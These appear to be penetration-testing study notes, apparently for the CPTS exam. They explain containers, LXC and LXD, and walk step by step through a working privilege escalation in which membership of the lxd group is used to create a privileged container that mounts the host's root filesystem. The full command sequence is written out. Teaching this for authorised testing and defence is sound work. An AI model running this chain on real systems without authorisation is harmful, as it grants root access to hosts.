## 1. Containers vs Virtual Machines

### Containers

Containers operate at the **operating-system level**.

They:

- Share the host's kernel
    
- Isolate application processes
    
- Consume fewer resources than traditional VMs
    
- Provide portability and easier deployment
    

```text
HOST
┌──────────────────────────────────────┐
│           Host OS / Kernel           │
│                                      │
│  ┌─────────┐   ┌─────────┐          │
│  │Container│   │Container│          │
│  │   App   │   │   App   │          │
│  └─────────┘   └─────────┘          │
│                                      │
└──────────────────────────────────────┘
```

### Virtual Machines

VMs virtualize at the **hardware level**.

```text
┌──────────── VM ────────────┐
│ Application                │
│ Guest OS                   │
└────────────────────────────┘
             │
        Hypervisor
             │
┌────────────────────────────┐
│        Host Hardware       │
└────────────────────────────┘
```

### Key Difference

```text
Containers → share host kernel
VMs        → separate guest operating systems
```

---

# 2. Why Isolation Matters

Isolation helps prevent an application from affecting the host system.

For example:

```text
Web Application
      │
      ↓
Container
      │
      X
      │
Host System
```

A vulnerable application can be isolated from sensitive host resources.

However:

> **Container isolation is only as strong as its configuration.**

Misconfigured containers can become a privilege-escalation path.

---

# 3. Linux Containers — LXC

**LXC (Linux Containers)** provides operating-system-level virtualization.

Multiple Linux environments can run on the same host while sharing the host kernel.

```text
                 HOST KERNEL
                     │
        ┌────────────┼────────────┐
        ↓            ↓            ↓
    LXC #1        LXC #2       LXC #3
    Linux         Linux        Linux
    processes     processes    processes
```

LXC is useful because containers generally consume fewer resources than VMs and provide a standard interface for managing multiple containers.

---

# 4. LXC vs LXD

### LXC

LXC is the container technology/interface used to run isolated Linux systems.

### LXD

**LXD** is a daemon designed to manage **system containers**.

Important CPTS distinction:

```text
LXC
 ↓
Container technology

LXD
 ↓
Container management daemon
 ↓
Can manage complete Linux system containers
```

---

# 5. Critical PrivEsc Vector — `lxd` / `lxc` Group

A particularly important enumeration step is:

```bash
id
```

Example:

```text
uid=1000(container-user) gid=1000(container-user) groups=1000(container-user),116(lxd)
```

The important part:

```text
groups=...,116(lxd)
             ↑
```

If the current user belongs to the **`lxd` or `lxc` group**, investigate LXC/LXD privilege escalation.

---

# 6. Why LXD Group Membership Is Dangerous

The basic attack concept is:

```text
Low-privileged user
        │
        ↓
Member of lxd/lxc group
        │
        ↓
Can manage containers
        │
        ↓
Create/configure container
        │
        ↓
Privileged container
        │
        ↓
Host filesystem mounted
        │
        ↓
Access host as root
```

The key issue is not simply:

```text
"I can create a container."
```

It is:

```text
"I can create/configure a container
that has privileged access to the host."
```

---

# 7. Container Images

LXD can use container images/templates.

Example:

```bash
cd ContainerImages
ls
```

Output:

```text
ubuntu-template.tar.xz
```

Templates can sometimes be poorly secured, particularly in test environments.

The module notes that some templates may have little or no password protection.

---

# 8. Importing an Image

Import the image:

```bash
lxc image import ubuntu-template.tar.xz --alias ubuntutemp
```

Then list images:

```bash
lxc image list
```

Conceptually:

```text
ubuntu-template.tar.xz
          │
          ↓
   lxc image import
          │
          ↓
      LXD image
          │
          ↓
   Can create container
```

---

# 9. Creating a Privileged Container

The module uses:

```bash
lxc init ubuntutemp privesc -c security.privileged=true
```

Important parameter:

```text
security.privileged=true
```

This creates a **privileged container**.

The module describes this configuration as disabling isolation features that would otherwise separate the container from the host.

### CPTS red flag

```text
security.privileged=true
```

🚨 Immediately investigate what host resources the container can access.

---

# 10. Mounting the Host Filesystem

The next command:

```bash
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```

Breakdown:

```text
Container:       privesc
Device name:     host-root
Device type:     disk
Host source:     /
Container path:  /mnt/root
Recursive:       true
```

The crucial part:

```text
source=/
```

means:

```text
HOST /
   │
   ↓
Container /mnt/root
```

Visualized:

```text
HOST
/
├── etc
├── home
├── root
├── var
├── usr
└── ...

        │
        │ mounted
        ↓

CONTAINER
/mnt/root
├── etc
├── home
├── root
├── var
├── usr
└── ...
```

---

# 11. Start the Container

```bash
lxc start privesc
```

Then enter it:

```bash
lxc exec privesc /bin/bash
```

The prompt becomes:

```text
root@nix02:~#
```

Then:

```bash
ls -l /mnt/root
```

shows the host's filesystem:

```text
/mnt/root
├── bin
├── boot
├── dev
├── etc
├── home
├── root
├── usr
├── var
└── ...
```

This demonstrates that the container has access to the **host filesystem**.

---

# 12. The Core LXD PrivEsc Chain

Memorize this:

```text
id
 │
 ↓
lxd group
 │
 ↓
LXD management access
 │
 ↓
Import/create container
 │
 ↓
security.privileged=true
 │
 ↓
Mount host /
 │
 ↓
Host filesystem → /mnt/root
 │
 ↓
Host resources accessible
 │
 ↓
Privilege escalation
```

---

# 13. Why `source=/` Is Important

This is one of the most important details in the example.

```bash
source=/
```

means the **host's root filesystem** is being exposed inside the container.

The container sees it at:

```bash
/mnt/root
```

Therefore:

```text
/mnt/root/etc
        ↓
Host /etc

/mnt/root/root
        ↓
Host /root

/mnt/root/home
        ↓
Host /home
```

---

# 14. Enumeration Checklist

When doing Linux privilege escalation, run:

```bash
id
```

If you see:

```text
lxd
```

or:

```text
lxc
```

investigate container-based privilege escalation.

Then look for:

```bash
lxc image list
```

and:

```bash
lxc list
```

The module specifically demonstrates importing an available image and creating a privileged container.

---

# 15. Container PrivEsc Indicators

### 🔴 High-value findings

```text
User ∈ lxd group
```

```text
User ∈ lxc group
```

```text
security.privileged=true
```

```text
Host filesystem mounted into container
```

```text
source=/
```

These should immediately attract attention during CPTS enumeration.

---

# 16. Connection to Privileged Groups

This connects directly to the previous **Privileged Groups** module:

```text
id
 │
 ├── sudo
 ├── docker
 ├── disk
 ├── adm
 └── lxd
```

Different groups provide different attack paths:

```text
lxd    → containers → host filesystem
docker → containers → host filesystem
disk   → raw disks → filesystem access
adm    → logs → information gathering
sudo   → privileged commands
```

So **`id` is one of the highest-value first commands during Linux PrivEsc enumeration.**

---

# 🔥 CPTS Must-Know

### Container vs VM

```text
Container → OS-level virtualization → shared kernel
VM        → hardware-level virtualization → guest OS
```

### LXC

```text
Linux Containers
→ OS-level virtualization
→ isolated Linux environments
→ shared host kernel
```

### LXD

```text
LXD
→ manages system containers
→ lxd/lxc group membership is important
```

### Enumeration

```bash
id
```

Look for:

```text
lxd
lxc
```

### Important commands

```bash
lxc image list
```

```bash
lxc init ubuntutemp privesc -c security.privileged=true
```

```bash
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```

```bash
lxc start privesc
```

```bash
lxc exec privesc /bin/bash
```

### Core concept

```text
lxd group
    ↓
Container management
    ↓
Privileged container
    ↓
Host filesystem mounted
    ↓
Host resources
    ↓
Privilege escalation
```

## 🧠 One-line CPTS Memory Trick

**`lxd` → create privileged container → mount host `/` → host filesystem access.**